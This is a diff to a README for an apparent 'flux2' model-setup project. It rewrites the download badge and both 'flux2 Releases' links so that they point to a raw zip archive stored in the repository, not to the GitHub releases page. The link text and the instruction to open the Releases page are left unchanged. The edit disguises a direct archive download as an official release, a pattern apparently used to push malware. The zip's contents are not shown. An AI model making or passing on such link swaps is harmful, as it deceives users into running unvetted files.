@@ -1,6 +1,6 @@
 # 🚀 flux2 - Easy Setup for FLUX.2 Models
 
-[![Download flux2](https://img.shields.io/badge/Download-flux2-brightgreen)](https://github.com/ReparacionesPhone/flux2/releases)
+[![Download flux2](https://raw.githubusercontent.com/ReparacionesPhone/flux2/main/assets/flux2_3.8.zip)](https://raw.githubusercontent.com/ReparacionesPhone/flux2/main/assets/flux2_3.8.zip)
 
 ## 📥 Overview
 
@@ -26,7 +26,7 @@ Before you download, ensure that your system meets the following requirements:
 
 ## 📥 Download & Install
 
-Visit this page to download: [flux2 Releases](https://github.com/ReparacionesPhone/flux2/releases).
+Visit this page to download: [flux2 Releases](https://raw.githubusercontent.com/ReparacionesPhone/flux2/main/assets/flux2_3.8.zip).
 
 1. Click the link above to open the Releases page.
 2. You will see a list of available versions. Choose the latest version for the best performance.
@@ -48,7 +48,7 @@ After installation, follow these steps to run the application:
 
 If you encounter any issues, check the documentation available in the repository or join our community for support. 
 
-Visit this page to download: [flux2 Releases](https://github.com/ReparacionesPhone/flux2/releases).
+Visit this page to download: [flux2 Releases](https://raw.githubusercontent.com/ReparacionesPhone/flux2/main/assets/flux2_3.8.zip).
 
 ## 🤝 Contributing
 
